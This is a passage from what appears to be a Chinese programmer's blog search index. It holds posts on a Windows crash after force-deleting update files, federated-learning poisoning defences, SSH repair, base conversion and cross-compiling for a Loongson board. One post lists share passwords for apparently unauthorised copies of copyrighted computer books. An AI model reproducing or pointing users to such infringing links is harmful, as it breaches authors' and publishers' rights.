这样一来，更新就不能安装了啊（恼）。可是虽然禁用了，但又没完全禁用，更新下载进程还在后台蹦跶着呢。这一看我就火了啊，打开更新目录：C:\\Windows\\SoftwareDistribution.删除。嗯？被占用？占用进程还是svchost.exe？好，火绒解除占用。什么？你说有危险，备份数据？我管呢，就是干（） 于是，就有了这篇文章。。。（泣）我两年都没换过的系统啊（大哭）就这么没了啊（哀嚎） 尝试过修复，但是完全没头绪啊（）不久结束了个进程吗？怎么就无限蓝屏重启了？ 错误代码：CRITICAL SERVICE FAILED 翻译成人话，就是关键进程启动失败。肯定就是svchost.exe啊。毕竟dll都离不开它，它发脾气，谁受得了啊（叹） 万般无奈之下，只得重装系统，和我Chrome里几百个标签页，以及好不容易磨合好的输入法、开发环境、vscode插件之类的含泪告别(〒▽〒) 不够也不错。刚好趁这个机会，把硬盘里那堆文件给收拾整齐了。 顺便，我貌似还有个文件管理区的坑没填来着（学完C#就去做 分析 先占着位置，后面再分析（咕 先写一点吧（） 这件事非常玄学。大概搜了一下，感觉原因很可能是进程强制结束导致的文件损坏。当时的关键操作基本就是用火绒解除占用这一点，后面得看下这个强制结束的机制。","link":"/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%94%A8%E7%81%AB%E7%BB%92%E7%9A%84%E4%B8%80%E6%AC%A1%E7%BF%BB%E8%BD%A6%E7%BB%8F%E5%8E%86%EF%BC%88/"},{"title":"联邦学习的投毒和攻防方法","text":"十分的交叉学科。具体而言就是机器学习领域的数据安全问题。 首先是标题 说的大概是一种新的人工智能学习范式。在这种防方式里也有攻击方式和相应的防御方式。 联邦学习简介 definition 联邦学习：一种分布式学习方法。解决的问题主要针对数据量不够/数据获取途径（成本问题），数据难以集中(法律问题和隐私问题)。一种时间方法是在本地进行小规模训练，然后将训练得到的模型参数上传汇总。不但规避了隐私版权问题，也保证了训练效果。 根据以样本和特征分别作为基准，联邦学习又分为横向/纵向：同特征不同样本/同样本不同特征。它们各自有着相当不同的模型参数聚合方法。后者通常发生在大型企业之间，而前者通常发生在用户/公司之间，双方并非信任关系。 前者的聚合方法有简单的加权平均FedAvg，有离群点修复FedProx，还有SCAFFOLD等。而后者则利用隐私求交集PSI来完成加密实体对齐。典型的纵向联邦学习框架有SecureBoost。 但是数据特征仍然是反映在梯度参数中的，通过深度梯度泄漏方法DLG，可以恢复训练数据，这样就间接泄漏了训练数据的隐私。 隐私数据保护方法防止梯度泄露的方法主要是两类：密码学方法和差分隐私（Differential Privacy）.前者有MPC和HE等，通信开销和计算量较大，但是精度较高。后者则有噪声问题的困扰。 联邦学习的攻击方法目的就是使训练模型很难收敛，破坏联邦学习模型的性能和可信度。 投毒攻击，给本地数据添加错误，来弱化学习效果；或者更改分布式训练的模型参数。攻击者的知识、能力越强则攻击能力越强 但是太离谱的数据会被数据清洗过滤掉，太小的数据又没啥效果。 目标/非目标攻击：针对特定/随即目标进行数据编造投毒攻击。 数据打乱：比如对于不同群体的用户数据，互换他们attribute的结果，最终使得结果在不同群体上相反。 投毒攻击的检测这种检测难度不小：投毒攻击检测和隐私保护间的矛盾、数据非独立分布、攻击隐蔽性。 比较朴素的思路就是使用数据挖掘的清洗方法，对离群点等进行清洗。比如说有一些聚合方法：Krum, Bulyan, Trimmed mean（修整均值）, Medium（中位数）等，都是一些经典的鲁棒性聚合规则。 防御方法首先是基于统计学的方法。但是它的局限性是只有少部分客户端被控制。 其次是用验证用数据集进行验证。不过这样纯粹的数据集很难找。 再者就是用机器学习方法1-AE进行检验。它首先在本地预训练一个自编码器模型，然后正式训练过程中基于自编码器计算各节点模型更新的重构误差。 2-GAN：可以用GAN尝试恢复出来训练样本来生成本地训练集，从而验证模型参数是否正常。但是缺陷是，无法应对在训练初期就发动攻击的方式。 区块链1-FLChain：由部分节点进行数据检测再进行上传，从而保证参数的正确性。问题是这部分节点如何选择，以及是否正常。解决方法可以是动态更新这部分成员结点，通过一系列置信度去更新这部分节点。 研究成果：神经网络模型水印初始模型嵌入水印，并对水印进行检测。缺点是上传的模型不能加密。当然也可以允许加密，不过可以聚合模型，用聚合后的模型检验上传者。或者，可以比对上传者的历史行为数据，以此检测上传节点是否异常。 时间有限，基本就到这里了。","link":"/2023/10/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E8%81%94%E9%82%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E6%8A%95%E6%AF%92%E5%92%8C%E6%94%BB%E9%98%B2%E6%96%B9%E6%B3%95/"},{"title":"计算机书籍收集","text":"直接放上原作者的链接吧（ 计算机类的书籍那么贵，作为一个几个小时看完一本书且机不离身的程序员，天天买纸质书是不可能的了，所以对电子书的需求量还是挺多的。为了方便广大的小伙伴也能方便找到对应的电子书，我花费洪荒之力从各个搜索网站收集了几百本常用的电子书。 重要说明：如果目录无法跳转的话，直接拉下去就可以了，这些书籍都是在同一个页面的，我只是方便大家找到对应的，弄了一个页内目录，不过有部分读者反馈他跳转不了（手机是绝对跳转不了的了）。 数据结构与算法相关书籍 计算机基础 操作系统 汇编语言 计算机网络 Python 1、Python基础 2、数据分析与爬虫 Linux C语言 C++ 人工智能 设计模式 Java Java 基础 数据库 Go 面试相关 数据结构与算法相关书籍 1.1《啊哈！算法 啊哈磊扫描版》 百度云下载链接 密码: 5h9s 1.2《算法图解》 百度云下载链接 密码: shda 1.3《妙趣横生的算法（C语言实现 第2版）》 百度云下载链接 密码: 6m7s 1.4《趣学算法》 百度云下载链接 密码: tu4r 1.5《大话数据结构》 百度云下载链接 密码: tlrq 1.6《算法神探完整版》 百度云下载链接 密码: ia5d 1.7《算法帝国》 百度云下载链接 密码: uwp8 1.8《算法设计与分析基础第3版》 百度云下载链接 密码: kpff 2.1《算法导论_英文版_第三版》 百度云下载链接 密码: ecms 2.1《算法导论中文版》 百度云下载链接 密码: fpqn 2.2《算法 (第4版)》 百度云下载链接 密码: k7ah 2.3《数据结构与算法 Java版》 百度云下载链接 密码: jw81 2.4《Algorithms算法概论中文版》 百度云下载链接 密码: goi3 2.5《算法心得-高效算法的奥秘(原书第2版)》 百度云下载链接 密码: nsip 2.6《计算机程序设计艺术 第1卷：基本算法（第三版）高清中文版》 百度云下载链接 密码: 931f 2.7《计算机程序设计艺术 第2卷：半数值算法（第三版）高清中文版》 百度云下载链接 密码: m4mh 2.8《计算机程序设计艺术 第3卷：排序与查找（第二版）高清中文版》 百度云下载链接 密码: o1r4 2.9《计算机算法设计与分析 第4版 (王晓东) 课后答案[1-9章]》 百度云下载链接 密码: 9rjh 2.9《计算机算法设计与分析(第三版)课后习题答案详解》 百度云下载链接 密码: 124d 2.9《计算机算法设计与分析(王晓东)(第二版)》 百度云下载链接 密码: wqep 2.9《计算机算法设计与分析(王晓东)(第三版)》 百度云下载链接 密码: 761w 2.9《数据结构（C语言版）-严蔚敏 吴伟民, 清华大学出版社, 2007》 百度云下载链接 密码: u86s 2.10《Java数据结构和算法(第二版)》 百度云下载链接 密码: eb8k 2.11《编程原本》 百度云下载链接 密码: 0hfj 2.12《算法设计手册第2版 中文版330页》 百度云下载链接 密码: 39mu 2.13《JavaScrit数据结构与算法（第2版）》 百度云下载链接 密码: q6uc 2.14《数据结构与算法分析：C语言描述（原书第2版）》 百度云下载链接 密码: gw2k 2.15《数据结构与算法Python语言描述_裘宗燕编著_北京：机械工业出版社_》 百度云下载链接 密码: 6r3v 3.1《挑战程序设计竞赛(第2版)》 百度云下载链接 密码: huat 3.2《算法艺术与信息学竞赛(清华大学出版社)》 百度云下载链接 密码: cebh 3.3《算法谜题》 百度云下载链接 密码: mq4c 3.4《编程高手箴言》 百度云下载链接 密码: 8km9 4.1《编程之法 面试和算法心得》 百度云下载链接 密码: cuev 4.2《程序员代码面试指南 IT名企算法与数据结构题目最优解 》 百度云下载链接 密码: fkug 4.3《算法Ⅰ-Ⅳ(C++ 实现)–基础、数据结构、排序和搜索(第三版)》 百度云下载链接 密码: 0mti 4.4《程序员实用算法》 百度云下载链接 密码: 7t52 4.5《编程珠玑（第2版）》 百度云下载链接 密码: nak4 4.6《编程之美》 百度云下载链接 密码: stoj 4.7《程序调试思想与实践》 百度云下载链接 密码: vak1 4.8《[改变未来的九大算法]管策》 百度云下载链接 密码: cr7l 4.9《排序算法汇总》 百度云下载链接 密码: 6ah8 4.10《算法与数据结构-实用算法基础教程》 百度云下载链接 密码: o7hw 5.1《matlab数学建模算法全收录 799页 47M 超清书签版》 百度云下载链接 密码: m41s 5.2《常用数据挖掘算法总结及ython实现》 百度云下载链接 密码: hg4w 5.3《机器学习十大算法》 百度云下载链接 密码: 2m1m 5.4《计算机程序设计艺术 The Art o Comuter rogramming 第2卷（第3版）英文版》 百度云下载链接 密码: 1088 5.5《算法百科 Encycloeia o Algorithms》 百度云下载链接 密码: toi8 5.6《智能Web算法(中文版)》 百度云下载链接 密码: dcom 5.7《现代计算机常用数据结构与算法》 百度云下载链接 密码: pmu4 5.8《数据挖掘原理与算法》 百度云下载链接 密码: ol6i 5.9《计算几何–算法与应用(中文第三版)》 百度云下载链接 密码: u03e 5.10《数值最优化算法（numerical otimization）》 百度云下载链接 密码: 1d0l 5.11《计算机图形学原理及算法教程(Visual C++版)-和青芳 清华大学出版社》 百度云下载链接 密码: nlmw 5.12《算法概论（Algorithm)》 百度云下载链接 密码: 4ewo 5.13《数据结构教程电子版 》 百度云下载链接 密码: 9934 5.14《图论中的常用经典算法》 百度云下载链接 密码: j7a5 计算机基础操作系统 30天填自制操作系统 百度云下载链接 密码:r616 操作系统之哲学原理 百度云下载链接 密码:2s4w 程序是怎样跑起来的 百度云下载链接 密码:4hkh 深入理解计算机操作系统 百度云下载链接 密码:ef4d 现代操作系统 百度云下载链接 密码:354c 汇编语言 汇编语言（注：这边是王爽写的，我觉得写的很好，适合入门） 百度云下载链接 密码:tlaf 计算机网络 计算机网络：自顶向下 百度云下载链接 密码:rs77 图解HTTP 百度云下载链接 密码:olev 图解TC/IP 百度云下载链接 密码:5k33 网络是怎样连接的 百度云下载链接 密码:d7io HTTP权威指南 百度云下载链接 密码:dfb8 UNIX网络编程 百度云下载链接 密码:2fsl Python1、Python基础 编程小白的第一本Python入门书 百度云下载链接 密码:4c6e Python编程初学者指南 百度云下载链接 密码:igr1 Python高级编程 百度云下载链接 密码:t0di Python灰帽子 百度云下载链接 密码:bfqp Python开发技术详解 百度云下载链接 密码:6jwm Python开发实战 百度云下载链接 密码:23ow Python网络编程基础 百度云下载链接 密码:7tqp Python学习手册 百度云下载链接 密码:hcrk 2、数据分析与爬虫 数据科学入门 百度云下载链接 密码:9rms 用Python写网络爬虫 百度云下载链接 密码:r5dp Python数据处理 百度云下载链接 密码:o0tv Python数据分析实战 百度云下载链接 密码:phi0 Python数据科学手册 百度云下载链接 密码:9a7o Python数据可视化编程实战 百度云下载链接 密码:1w8m 精通Scrapy网络爬虫 百度云下载链接 密码:tcbi Linux 精通正则表达式 百度云下载链接 密码:f1d4 鸟哥的Linux私房菜基础篇和服务器篇 百度云下载链接 密码:tja9 深入Linux内核架构 百度云下载链接 密码:47fg Linux宝典 百度云下载链接 密码:krrb Linux常用命令大全 百度云下载链接 密码:2pub Linux防火墙 百度云下载链接 密码:gok4 Linux高级程序设计 百度云下载链接 密码:kkvf Linux环境编程 百度云下载链接 密码:5h9g Linux命令详解词典 百度云下载链接 密码:es5e 汇编语言基于linux环境第3版 百度云下载链接 密码:g99m C语言 经典C程序100例 百度云下载链接 密码:afk7 C Primer Plus 百度云下载链接 密码:fod7 C程序设计语言（包括课后答案等） 百度云下载链接 密码:b840 C和指针 百度云下载链接 密码:76qm C语言编程精粹 百度云下载链接 密码:e3vm C语言参考手册 百度云下载链接 密码:8hvu C语言函数大全 百度云下载链接 密码:vimv C语言解析教程 百度云下载链接 密码:64a3 C语言深度剖析 百度云下载链接 密码:i8jv C专家编程 百度云下载链接 密码:46ds C++ C++ Primer 百度云下载链接 密码:2rdb C++编程思想 百度云下载链接 密码:s033 C++对象模型 百度云下载链接 密码:4n4j 深入探索C++对象模型 百度云下载链接 密码:e1vr C++ Templates 百度云下载链接 密码:btl8 C++编程规范-101条规则准则与最佳实践 百度云下载链接 密码:qwlv C++沉思录中文第2版 百度云下载链接 密码:oiqw C++大学教程 百度云下载链接 密码:s7iq C++设计新思维-泛型编程与设计之应用 百度云下载链接 密码:p40u Effective STL 中文版 百度云下载链接 密码:pqrp More Effective C++中文版 百度云下载链接 密码:e4mf STL源码剖析 百度云下载链接 密码:dadw 人工智能 贝叶斯思维统计建模的Python学习法 百度云下载链接 密码:ffik 机器学习实战 百度云下载链接 密码:4fns Python机器学习及实践 百度云下载链接 密码:ah7s Tensorflow实战Google深度学习框架 百度云下载链接 密码:1vcd TensorFlow实践与智能系统 百度云下载链接 密码:e0i9 深度学习_中文版 百度云下载链接 密码:w7k4 设计模式 图解设计模式 百度云下载链接 密码:5k00 研磨设计模式 百度云下载链接 密码:q03j Head First设计模式 百度云下载链接 密码:hidi JavaJava 基础 阿里巴巴Java开发手册.zip 百度云下载链接 提取码: f0wg 代码大全.zip 百度云下载链接 提取码: ebfh 代码整洁之道.zip 百度云下载链接 提取码: 8nng 码出高效.zip 百度云下载链接 提取码: qhlt 敏捷软件开发.zip 百度云下载链接 提取码: oeww 轻量级JavaEE企业应用实战.zip 百度云下载链接 提取码: ee2o 深入分析JavaWeb技术内幕.zip 百度云下载链接 提取码: mg6b 深入理解Java虚拟机.zip 百度云下载链接 提取码: 36eu 深入剖析Tomcat.zip 百度云下载链接 提取码: l5fr Camel in Action.zip 百度云下载链接 提取码: 7md7 Effective Java.zip 百度云下载链接 提取码: 1si0 Effective Java（英文版）《防失效，搅乱书名》.zip 百度云下载链接 提取码: tq4f Head First Java.zip 百度云下载链接 提取码: gq2k Head First Servlet and JSP.zip 百度云下载链接 提取码: vlgp Java8实战.zip 百度云下载链接 提取码: 5uil Java编程思想.zip 百度云下载链接 提取码: hpe9 Java并发编程的艺术.zip 百度云下载链接 提取码: 8hid Java并发编程实践.zip 百度云下载链接 提取码: qjf8 Java从小白到大牛.zip 百度云下载链接 提取码: vncd Java核心技术.zip 百度云下载链接 提取码: 7wlo Java性能优化权威指南.zip 百度云下载链接 提取码: ghs9 Maven实战.zip 百度云下载链接 提取码: a0e9 Spring实战.zip 百度云下载链接 提取码: 6dao 数据库 高性能MySQL 百度云下载链接 密码:4g3g 深入浅出MySQL 百度云下载链接 密码:vbve MongoDB权威指南 百度云下载链接 密码:jr88 MySQL必知必会 百度云下载链接 密码:v5jg MySQL技术内幕InnoDB存储引擎 百度云下载链接 密码:c2tv SQL查询的艺术 百度云下载链接 密码:j462 SQLite 权威指南 百度云下载链接 密码:ewv1 Go 学习Go语言 百度云下载链接 密码:eut4 Go语言实战 百度云下载链接 密码:bauv Go web编程 百度云下载链接 密码:aenp C 程序设计语言第2版 百度云下载链接 密码:liqm 面试相关 阿里巴巴Java面试问题大全 百度云下载链接 密码:f7v3 程序员面试宝典 百度云下载链接 密码:v21s 大厂面试真题 百度云下载链接 密码:qtis Java面试突击 百度云下载链接 密码:35sp 书籍全部来源于网络其他人的整理，我这里只是收集整理了他们的链接，如有侵权，马上联系我，我立马删除对应链接。我的邮箱：1362305590@qq.com","link":"/2021/07/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%B9%A6%E7%B1%8D%E6%94%B6%E9%9B%86/"},{"title":"记一次ssh翻车","text":"额……其实好久都没更文章就是这个原因qwq（阿里云背锅） 大概是服务器[[SSH简介|ssh]]挂掉了，结果就一直不能进服务器。差一点都想直接重装了（ 好在最后是修好了。下面记一下修复过程。 发现问题后，直接登阿里云控制台，发现提供了vnc可以用来应急救援。 登上，重装ssh。指令： 123456789apt-get remove openssh-server openssh-client --purgeapt-get autoremoveapt-get autocleanapt-get updateapt-get install openssh-server openssh-client 装完之后，切换到/etc/ssh/目录，用vim编辑配置文件sshd_config： 1vim /etc/ssh/sshd_config 重启ssh服务： 1service sshd restart 再次登录。成功，完美解决。拍照留念（","link":"/2020/12/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E8%AE%B0%E4%B8%80%E6%AC%A1ssh%E7%BF%BB%E8%BD%A6/"},{"title":"进制转换","text":"进制，也就是满X进一。其本质上是对于计数的简写。比如原来要表示一个数，只能用若干个小棒来表示。进制的出现，就相当于出现了代表一定数值的小棒的出现。这也就是位权：满X进一中的X。 （摘自百度百科）进制转换是人们利用符号来计数的方法。进制转换由一组数码符号和两个基本因素“基数”与“位权”构成。基数是指，进位计数制中所采用的数码（数制中用来表示“量”的符号）的个数。位权是指，进位制中每一固定位置对应的单位值。 理解了进制的本质后，我们就可以着手用数学工具去实现进制转换了。 短除法首先以十进制为例。规定//为带余数除法，我们规定一个正整数123，那么： 123123 // 10 = 12......312 // 10 = 1 ......21 // 10 = 0 ......1 观察。可以得到，三次除法的余数分别是3，2，1.对应个位，十位，百位。为什么呢？因为 1123（10）=1*10^2+2*10^1+3*10^0 所以，每次得到的余数，就是对应位的数。显然，此结论对于N进制都成立。 下面，我们用编程实现这个算法。 12345678910111213141516171819202122232425262728293031/* Dec2Bin - by xeonds */#include &lt;stdio.h&gt;int base_dec_2_bin_convert(int num);int main(void){ int i; scanf(&quot;%d&quot;, &amp;i); if (i &lt;= 512 &amp;&amp; i &gt;= -512) printf(&quot;dec:%d bin:%d\\n&quot;, i, base_dec_2_bin_convert(i)); else puts(&quot;Out of range.&quot;); return 0;}int base_dec_2_bin_convert(int num){ int result = 0, i = 1; while (num &gt; 0) { result += num % 2 * i; num = (num - num % 2) / 2; i *= 10; } return result;} 算法核心部分是最后几行。num % 2 * i是计算最后一位并乘10，便于用int表示。num = (num - num % 2) / 2是将num减去余数并除以位权。 用[[Python|Python]]的话还可以写得更短些： 12345678#!/usr/bin/pythondef base_10_to_2(number): result = '' while number: number, rest = divmod(number, 2) result = str(rest) + result return result 更进一步，我们可以实现任意进制转换： 1234567def base_n_convert(number, letters): length = len(letters) result = '' while number: number, rest = divmod(number-1, length) result = letters[rest] + result return result 其实这是我写的一个密码字典生成器。效率暂且不论，其原理也是进制转换。这里的number是待转换的十进制数，letters是待转换的N进制数的所有字符，比如十进制是09，十六进制是0F。 上面实现的，都是10进制转其他进制。其他进制转十进制很简单，只需要将各个位乘以其位权，求和即可得到其十进制表示。其原因很简单，我们的数学体系是建立在十进制的，所以对于十进制环境下的各种运算都很熟悉。这个方法对于任意进制转p进制其实都适用，不过这需要编写相应进制的四则运算算法，相对麻烦一些。 任意进制和任意进制的互转，可直接也可间接。间接，即将p进制数先转换为10进制等中间进制，再将其转换为q进制。直接，即利用对应规则进行转换。如二进制和十六进制互转，便可利用有限个对应规则实现快速互转。 小结和栈机制一样，进制转换是很多技术的基础。某些时候利用它，或许会获得意想不到的奇效。 同时，作为算法的源泉，数学真的很重要。","link":"/2021/09/23/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2/"},{"title":"龙芯久久派Plus折腾笔记","text":"感谢尚宇学长送的开发板，希望龙芯以后发展越来越好&lt;(=w=)&gt; 这回折腾用到的主要有： 本体：2k0300 久久派_Plus_V1.0 开发设备：Linux环境笔记本电脑 串口转接器：用一个老51开发板糊弄过去了（ 路由器：提供稳定网络连接和局域网 开箱 尊贵的总裁签名版（虽然看不太清）↑ 接口丰富度没得说，两个RJ45，两个USB2.0，一个3.5mm音频接口，UART，ADC，JTAG和Type-C供电，还有个MicroSD卡插槽。 这规格，只要三位数出头的价格，它就是炸了我都夸它炸得好听。稳定性跟功耗也没得说，ABI2.0的龙架构让它能拥有开源社区的支持，基本所有开源软件都可以通过交叉编译在这个板子上使用，未来可期属于是。 上电手头刚好没USB转串口，想到个幽默办法。掏出以前的51单片机开发板HC6800MS，给ST89C52RC薅下来，TX，RX，GND分别接到开发板的RXD0，TXD0，GND上： 然后给那个老板子插电脑上： 诶，这不就有了吗。 现在就能用screen从串口连接上开发板了： 1sudo screen /dev/ttyUSB0 115200 效果如下： 板子上电之后会默认启动WiFi热点，配置文件如下： 1234567891011121314#/etc/hostapd.confinterface=wlan0 driver=nl80211 ssid=LoongsonWIFI hw_mode=g channel=6 macaddr_acl=0 auth_algs=1 ignore_broadcast_ssid=0 wpa=2 wpa_passphrase=loongson123456 wpa_key_mgmt=WPA-PSK wpa_pairwise=TKIP rsn_pairwise=CCMP 虽然可以连上WiFi，但是它的sshd进程好像是默认不开启的。 哦它没有openssh啊。 交叉编译 在x86设备上跨架构构建龙芯的Arch Linux软件包 - 星外之神的博客 | wszqkzqk Blogpacman/提示和技巧 - Arch Linux 中文维基离线安装 - Arch Linux 中文维基从现有 Linux 发行版安装 Arch Linux - Arch Linux 中文维基 参数，来自xdosc的佬@chi 1CFLAGS='--with-arch=loongarch64 --with-tune=la464 --with-abi=lp64d --with-simd=none --disable-threads' OpenSSH准备目录./openssh并进入，下载源码： 123456wget https://cdn.openbsd.org/pub/OpenBSD/OpenSSH/portable/openssh-9.8p 1.tar.gzwget http://www.zlib.net/zlib-1.3.1.tar.gzwget https://github.com/openssl/openssl/releases/download/openssl-3.3. 2/openssl-3.3.2.tar.gzfor item in $(ls ./);do tar -zxvf $item; done 创建目录./openssh/install创建脚本env.sh： 12#!/bin/bashexport PATH=&quot;$PATH:/path/to/cross-tools/bin&quot; 上面指向的是交叉编译工具链的路径，提前准备。 准备环境：source ~/env.sh 编译zlib： 1234cd zlib-1.3.1/prefix=$HOME/2k300/openssh/zlib CC=loongarch64-unknown-linux-gnu-gcc AR=loongarch64-unknown-linux-gnu-ar ./configuremakemake install 编译openssl： 1234cd openssl-3.3.2/./Configure linux64-loongarch64 --cross-compile-prefix=loongarch64-unknown-linux-gnu- --prefix=$HOME/2k300/openssh/install/openssl shared no-asmmakemake install 编译openssh： 1234./configure --host=loongarch64-unknown-linux-gnu --prefix=$HOME/2k300/openssh/install/openssh --with-ssl-dir=$HOME/2k300/openssh/install/openssl --with-zlib=$HOME /2k300/openssh/install/zlib LDFLAGS=&quot;-static -pthread&quot; --sysconfdir=/etc/ssh --disable-stripmakemake install-files 注意 此处使用~概率会导致编译异常，使用$HOME代替 这里因为没找到在哪指定strip工具的位置而禁用了strip，所以产物会稍微有丶大。 编译结束之后，产物可以在$HOME/2k300/openssh/install/openssh中找到。直接把文件传输到99pi对应的目录里即可。 传输方法可以使用tty串口传输，不过速度太慢： 1234# server-sideuuencode [filename-in-99pi] &lt; [file] &gt; /dev/ttyUSB0# 99pi-sideuudecode &lt; /dev/ttyS0 也可以使用tftp传输： 1234# server-side:sudo uftpd -n -o ftp=0,tftp=69 ./# 99pi-sidetftp -g -l ssh-xxx -r openssh/bin/ssh-xxx [114.5.1.4] 剩下的后面说。 Vim ncurses: https://ftp.gnu.org/gnu/ncurses/ncurses-6.5.tar.gz vim: https://github.com/vim/vim 1234tar -zxvf ncurses-6.5.tar.gz &amp;&amp; rm ncurses-6.5.tar.gzcd ncurses-6.5/./configure --prefix=$HOME/2k300/vim/nc_install --host=loongarch64-unknown-linux-gnu --without-cxx-binding --without-ada --without-progs --without-tests --with-sharedmake -j &amp;&amp; make install 12export TARGET=loongarch64-unknown-linux-gnu Linux Kernel 参考文档：龙芯2K300.软件uboot用户手册0.2 把linux6.9源码里的 arch/loongarch/boot/dts include/dts-bindings 复制到新的内核源码的对应位置，然后 12make ARCH=loongarch CROSS_COMPILE=loongarch64-unknown-linux-gnu- ls2k0300_99_pai_wifi_defconfigmake ARCH=loongarch CROSS_COMPILE=loongarch64-unknown-linux-gnu- -j8 产物： arch/loongarch/boot/vmlinux.bin System.map 现在制作vmlinux.bin.lzma 12lzma -k ./linux-6.11/arch/loongarch/boot/vmlinux.binmv ./linux-6.11/arch/loongarch/boot/vmlinux.bin.lzma ./ 创建文件：multi.its，并更新其中的 images/kernel-1/entry：为./linux-6.11/System.map中的kernel_entry的地址，格式参考下方 images/kernel-1/data：为lzma文件相对于当前文件的路径 12345678910111213141516171819202122232425262728/** U-Boot uImage source file with multiple kernels and ramdisks blobs*//dts-v1/;/{ description = &quot;Various kernels and ramdisks blobs&quot;; #address-cells = &lt;2&gt;; images { kernel-1 { description = &quot;vmlinux&quot;; data = /incbin/(&quot;vmlinux.bin.lzma&quot;); type = &quot;kernel&quot;; arch = &quot;loongarch&quot;; os = &quot;linux&quot;; compression = &quot;lzma&quot;; load = &lt;0x90000000 0x00200000&gt;; entry = &lt;0x90000000 0x01348000&gt;; }; }; configurations { default = &quot;config-1&quot;; config-1 { description = &quot;vanilla-2.6.23 configuration&quot;; kernel = &quot;kernel-1&quot;; loadables = &quot;kernel-1&quot;; }; };}; 生成uImage镜像：mkimage -f multi.its uImage Arch Linux主要原因是aur比较香，而且软件分发也相对简单，反正pacman作为包管理够用。 北大的LCPU整了个LA64的AUR镜像源： Arch Linux for Loongarch64 arch安装的核心就是准备一个能跑起来pacstrap的环境，然后就能用pacstrap去准备arch的rootfs了。 意外发现原来有LA64的arch安装iso，这下不用自己准备rootfs了，好耶居然忘了3A6000已经能用Arch了 哦，忘了，3A6000的abi跟2K0300不太一样，果然最后还是翻车了 解压发现其中的airootfs.sfs，arch下安装squashfs-tools后，使用sudo unsquashfs airootfs.sfs解压rootfs。完成后编译一个uImage，丢到rootfs的/boot下。 准备一个ext4的U盘，将rootfs复制到其中。U盘插入99pi，启动并进入uboot cli，输入： 12ext4load usb 0 ${loadaddr} boot/uImagebootm ${loadaddr} 手动启动系统。 不过启动失败了，查报错感觉问题可能出在指令集不兼容上了，似乎是LA64的SIMD指令在2k300上用不了。 下一步应该就是手动编译一个arch rootfs再安装了。 刷uboot可以借助tftp刷入，也可以usb刷入。我用了后一种方法： 12345# 主系统mkfs.ext2 /dev/sdb # 格式化U盘mount /dev/sdb ./tmpcp u-boot-spl-gz.bin ./tmp/umount ./tmp 1234# 99pi# 插入U盘# 启动时多次按c进入PMON控制台fload /dev/fs/ext2@usb0/u-boot-spl-gz.bin 下面是输出： 12345678910PMON&gt; fload /dev/fs/ext2@usb0/u-boot-spl-gz.bin / Loading file: /dev/fs/ext2@usb0/u-boot-spl-gz.bin dl_offset 900000000f800000 addr 900000000f800000 (bin) | Loaded 580432 bytes Programming flash 900000000f800000:8db50 into 800000001c000000 Erase end! / Programming end! Verifying FLASH. No Errors found. PMON&gt; 此时就完成了，可以重启了。 配置uboot参数12setenv bootargs console=ttyS0,115200n8 root=/dev/sda1 rootdelay=3saveenv 编译busybox最小系统流程很简单： 1mkdir -p ./{src,} 问题 编译失败 不知道为啥，换musl-gcc就可以了。 make menuconfig总是会失败 刚开始以为确实是依赖问题，把能想到的玩意都装了一圈之后觉得不对劲上Arch Wiki搜了一下： [已解决] make menuconfig 和 ncurses 库的问题 / 新手 / Arch Linux 论坛esp8266-rtos-sdk-aur-ncurses-fix.patch - aur.git - AUR Package Repositories 最后发现是./scripts/kconfig/lxdialog/check-lxdialog.sh的锅。里边的check()函数对main的写法有问题：应该在下图的main()前面加上int才能正常check到是否安装了ncurses库。 启动失败 我这里是因为menuconfig总是失败所以没法开Build static binary，开开就能跑了。","link":"/2024/09/12/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E9%BE%99%E8%8A%AF%E4%B9%85%E4%B9%85%E6%B4%BEPlus%E6%8A%98%E8%85%BE%E7%AC%94%E8%AE%B0/"},{"title":"常用分布的期望和方差","text":"分布 分布律/概率密度 数学期望 方差 0-1分布 $p(x=k)=p^k(1-p)^{1-k},k=0,1$ $p$ $p(1-p)$ 二项分布$B(n,p)$ $P(x=k)=C_n^kp^k(1-p)^{1-k}$ $np$ $np(1-p)$ 泊松分布$P(\\lambda)$ $P(x=k)=\\frac{\\lambda^ke^{-\\lambda}}{k!}$ $\\lambda$ $\\lambda$ 均匀分布$U(a,b)$ $f(x)=\\frac{1}{b-a},(a\\lt x\\lt b)$ $\\frac{a+b}{2}$ $\\frac{(b-a)^2}{12}$ 正态分布$N(\\mu,\\sigma^2)$ $f(x)=\\frac{1}{\\sqrt{2\\pi}\\sigma}e^{-\\frac{(x-\\mu)^2}{2\\sigma^2}}$ $\\mu$ $\\sigma^2$ 指数分布$E(\\theta)$ $f(x)=\\theta e^{-\\theta x},x\\gt 0; 0, other$ $\\frac{1}{\\theta}$ $\\frac{1}{\\theta^2}$","link":"/2023/01/30/%E6%95%B0%E5%AD%A6/%E6%A6%82%E7%8E%87%E8%AE%BA%E4%B8%8E%E6%95%B0%E7%90%86%E7%BB%9F%E8%AE%A1/%E5%B8%B8%E7%94%A8%E5%88%86%E5%B8%83%E7%9A%84%E6%9C%9F%E6%9C%9B%E5%92%8C%E6%96%B9%E5%B7%AE/"},{"title":"第一章：概率论的基本概念","text":"概率论的内容组织线索： 随机现象与随机实验随机现象分为确定性现象、不确定性现象。前者结果确定，例如太阳东升西落；后者现象不确定，例如未来的天气。随机试验E表示，针对随机现象的观察、记录、试验。它有如下特点： 可重复 全部可能性已知 试验前不确定试验结果 样本空间与随机事件样本空间$\\Omega$ 指的是随机试验E的所有结果构成的集合，记为$\\Omega={e}$。每个结果$e$是$\\Omega$中一个元素，称为样本点。其中的元素数量可以无限。 一些随机试验E的样本点的集合（可空）称为随机事件，也称事件。全体样本点构成的集合称为样本空间，记为$\\Omega$。每次试验，当且仅当该子集的一个样本点出现时，称这一事件发生。 如果Ω只包含有限个样本点，则单个样本点构成的事件（单点集），称为基本事件。 如果将Ω亦视作事件，是自身子集，则每次试验，Ω总是发生，称为必然事件。 